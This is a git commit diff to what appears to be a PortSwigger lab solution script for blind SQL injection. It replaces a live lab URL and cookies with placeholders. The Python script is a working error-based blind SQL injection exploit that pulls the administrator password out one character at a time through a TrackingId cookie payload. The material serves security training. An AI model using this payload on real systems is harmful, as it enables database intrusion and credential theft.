53ad1cf9a3f0341818f77dbaec026e2f4db2ac10
Khalid emad <58134995+khaled1000emad@users.noreply.github.com>
2022-05-06 08:07:54 +0200

    Update lab12-script.py

--- PortSwigger/Blind SQL Injection/lab12-script.py
+++ PortSwigger/Blind SQL Injection/lab12-script.py
@@ -2,15 +2,15 @@ import requests
 import string
 
 chars = string.ascii_lowercase+string.digits
-url='https://ac3b1f2a1e0d6987c053f3290061008a.web-security-academy.net/'
+url='YOUR_LAB_URL'
 password=""
 counter=1
 while True:
     for char in chars:
         with requests.session() as sess:
             r = sess.get(url, cookies={
-                "TrackingId":f"QvsXGUHpV1JdQico'||(select+case+when((select+substr(password,{counter},1)+from+users+where+username='administrator')='{char}')+then+to_char(1/0)+else+NULL+end+from+dual)||'",
-                "session":"IPvFD5aMkPrNj5jHyLv1U7xj5UHxIDj4"
+                "TrackingId":f"YOUR_TRACKING_ID'||(select+case+when((select+substr(password,{counter},1)+from+users+where+username='administrator')='{char}')+then+to_char(1/0)+else+NULL+end+from+dual)||'",
+                "session":"YOUR_SESSION"
             })
         if(r.status_code==500):
             password+=char
